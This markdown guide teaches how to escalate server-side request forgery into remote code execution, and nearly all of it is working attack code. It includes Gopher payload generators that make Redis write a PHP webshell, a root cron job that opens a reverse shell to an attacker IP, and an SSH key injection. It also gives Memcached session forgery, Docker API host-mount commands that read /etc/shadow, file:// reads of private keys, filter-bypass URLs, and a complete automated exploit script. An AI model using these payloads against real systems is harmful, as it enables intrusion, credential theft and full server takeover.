# SSRF to RCE Escalation Guide

> Escalate Server-Side Request Forgery into Remote Code Execution by targeting internal services that accept unauthenticated commands. Covers Redis, Memcached, and other internal services accessible via Gopher protocol and HTTP-based SSRF.

## 1. Identifying Internal Services via SSRF

Use SSRF to scan internal networks and discover exploitable services:

```bash
# Port scan internal network through SSRF
for port in 6379 11211 9200 5984 2379 27017 9000; do
  RESP=$(curl -s -o /dev/null -w '%{http_code}' \
    "https://target.com/fetch?url=http://127.0.0.1:${port}/")
  echo "Port $port: HTTP $RESP"
done

# Scan internal subnet for Redis instances
for ip in $(seq 1 254); do
  curl -s "https://target.com/fetch?url=http://10.0.0.${ip}:6379/info" | \
    grep -q "redis_version" && echo "[+] Redis found at 10.0.0.${ip}"
done
```

## 2. Redis Exploitation via Gopher Protocol

Redis accepts commands over raw TCP. Gopher protocol enables arbitrary TCP data through SSRF:

```bash
# Generate Gopher payload to write a webshell via Redis
python3 -c "
import urllib.parse

# Redis commands to write a PHP webshell
commands = [
    'FLUSHALL',
    'SET shell \"<?php system(\$_GET[\\\"cmd\\\"]); ?>\"',
    'CONFIG SET dir /var/www/html/',
    'CONFIG SET dbfilename shell.php',
    'SAVE',
    'QUIT'
]

# Format as Redis protocol (RESP)
payload = ''
for cmd in commands:
    parts = cmd.split(' ', 2) if ' ' in cmd else [cmd]
    payload += f'*{len(parts)}\r\n'
    for part in parts:
        payload += f'\${len(part)}\r\n{part}\r\n'

# URL-encode for Gopher
encoded = urllib.parse.quote(payload, safe='')
print(f'gopher://127.0.0.1:6379/_{encoded}')
"
```

```bash
# Send the Gopher payload through SSRF
GOPHER_PAYLOAD="gopher://127.0.0.1:6379/_*1%0D%0A%244%0D%0AFLUSHALL..."
curl -s "https://target.com/fetch?url=${GOPHER_PAYLOAD}"

# Verify webshell was written
curl "https://target.com/shell.php?cmd=id"
```

## 3. Redis Cron Job for Reverse Shell

Write a cron job through Redis for persistent RCE:

```python
import urllib.parse

def generate_redis_cron_payload(attacker_ip, attacker_port):
    """Generate Redis commands to create a reverse shell cron job."""
    cron_content = f"\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'\n\n"
    
    commands = [
        "FLUSHALL",
        f'SET cron "{cron_content}"',
        "CONFIG SET dir /var/spool/cron/crontabs/",
        "CONFIG SET dbfilename root",
        "SAVE",
        "QUIT"
    ]
    
    payload = ""
    for cmd in commands:
        parts = cmd.split(" ", 2) if " " in cmd else [cmd]
        payload += f"*{len(parts)}\r\n"
        for part in parts:
            payload += f"${len(part)}\r\n{part}\r\n"
    
    encoded = urllib.parse.quote(payload, safe="")
    return f"gopher://127.0.0.1:6379/_{encoded}"

# Alternative: SSH key injection via Redis
def generate_redis_ssh_payload(public_key):
    """Write attacker's SSH key to authorized_keys via Redis."""
    ssh_content = f"\n\n{public_key}\n\n"
    commands = [
        "FLUSHALL",
        f'SET sshkey "{ssh_content}"',
        "CONFIG SET dir /root/.ssh/",
        "CONFIG SET dbfilename authorized_keys",
        "SAVE",
    ]
    # ... encode as above
```

## 4. Memcached Exploitation

Inject serialized objects into Memcached for deserialization RCE:

```bash
# Gopher payload to inject into Memcached
# Target: PHP application using Memcached for session storage
python3 -c "
import urllib.parse

# Inject a serialized PHP object into a session key
session_id = 'attacker_session_123'
# PHP serialized admin session
serialized = 'admin|s:1:\"1\";username|s:5:\"admin\";role|s:5:\"admin\";'

# Memcached SET command (text protocol)
payload = f'set session:{session_id} 0 3600 {len(serialized)}\r\n{serialized}\r\n'
encoded = urllib.parse.quote(payload, safe='')
print(f'gopher://127.0.0.1:11211/_{encoded}')
"

# After injection, use the forged session
curl -b "PHPSESSID=attacker_session_123" https://target.com/admin/
```

## 5. Exploiting Internal HTTP Services

Target internal APIs and management interfaces:

```bash
# Elasticsearch RCE (older versions with scripting enabled)
curl "https://target.com/fetch?url=http://127.0.0.1:9200/_search" \
  --data '{"query":{"match_all":{}},"script_fields":{"cmd":{"script":"Runtime.getRuntime().exec(\"id\")"}}}'

# Docker API (if exposed internally on port 2375)
# List containers
curl "https://target.com/fetch?url=http://127.0.0.1:2375/containers/json"

# Create and start a container with host filesystem mounted
curl "https://target.com/fetch?url=http://127.0.0.1:2375/containers/create" \
  -X POST -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],"Binds":["/:/host"]}'

# Kubernetes API (internal service account)
curl "https://target.com/fetch?url=https://kubernetes.default.svc/api/v1/namespaces/default/pods"
```

## 6. URL Scheme Abuse Beyond Gopher

Leverage various URL schemes for exploitation:

```bash
# file:// — Read local files through SSRF
curl "https://target.com/fetch?url=file:///etc/passwd"
curl "https://target.com/fetch?url=file:///proc/self/environ"  # Environment variables
curl "https://target.com/fetch?url=file:///root/.ssh/id_rsa"

# dict:// — Interact with dict protocol services
curl "https://target.com/fetch?url=dict://127.0.0.1:6379/INFO"

# ftp:// — Interact with internal FTP servers
curl "https://target.com/fetch?url=ftp://127.0.0.1/etc/passwd"

# ldap:// — Query internal LDAP directories
curl "https://target.com/fetch?url=ldap://127.0.0.1:389/dc=corp,dc=local"
```

## 7. Bypassing SSRF Filters for Internal Access

Common filter bypasses to reach internal services:

```bash
# IP address encoding tricks
# Decimal notation
curl "https://target.com/fetch?url=http://2130706433:6379/"  # 127.0.0.1

# IPv6 representations
curl "https://target.com/fetch?url=http://[::1]:6379/"
curl "https://target.com/fetch?url=http://[0:0:0:0:0:ffff:127.0.0.1]:6379/"

# DNS rebinding (point a domain at 127.0.0.1)
curl "https://target.com/fetch?url=http://localtest.me:6379/"

# URL parsing confusion
curl "https://target.com/fetch?url=http://evil.com@127.0.0.1:6379/"
curl "https://target.com/fetch?url=http://127.0.0.1:6379#@allowed-domain.com"

# Redirect-based bypass (attacker server redirects to internal IP)
# attacker.com/redirect → 302 → http://127.0.0.1:6379/
curl "https://target.com/fetch?url=https://attacker.com/redirect"
```

## 8. Full Exploitation Chain Example

Complete SSRF-to-RCE attack flow:

```bash
#!/bin/bash
# ssrf-to-rce.sh — Automated SSRF to RCE via Redis
TARGET="https://vulnerable-app.com/api/fetch"
ATTACKER_IP="10.10.14.5"
ATTACKER_PORT="4444"

echo "[1] Confirming SSRF..."
curl -s "$TARGET?url=http://127.0.0.1:6379/info" | grep -q "redis_version" || {
  echo "[-] Redis not accessible via SSRF"; exit 1
}
echo "[+] Redis confirmed accessible"

echo "[2] Generating reverse shell payload..."
CRON="\n\n*/1 * * * * bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1'\n\n"
PAYLOAD=$(python3 -c "
import urllib.parse
cron = '$CRON'
cmds = f'*3\r\n\$3\r\nSET\r\n\$4\r\ncron\r\n\${len(cron)}\r\n{cron}\r\n'
cmds += '*4\r\n\$6\r\nCONFIG\r\n\$3\r\nSET\r\n\$3\r\ndir\r\n\$16\r\n/var/spool/cron/\r\n'
cmds += '*4\r\n\$6\r\nCONFIG\r\n\$3\r\nSET\r\n\$10\r\ndbfilename\r\n\$4\r\nroot\r\n'
cmds += '*1\r\n\$4\r\nSAVE\r\n'
print('gopher://127.0.0.1:6379/_' + urllib.parse.quote(cmds))
")

echo "[3] Sending payload via SSRF..."
curl -s "$TARGET?url=$PAYLOAD"

echo "[4] Start listener: nc -lvnp $ATTACKER_PORT"
echo "[*] Shell should arrive within 60 seconds"
```

Key principles: always verify internal service accessibility before crafting payloads, use Gopher for raw TCP protocols, and chain multiple internal services when direct RCE is not possible.

## References

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [SSRF Bible (Assetnote)](https://assetnote.io/research/)
- [PortSwigger SSRF Labs](https://portswigger.net/web-security/ssrf)
- [Cloud SSRF Techniques](https://hackerone.com/hacktivity)
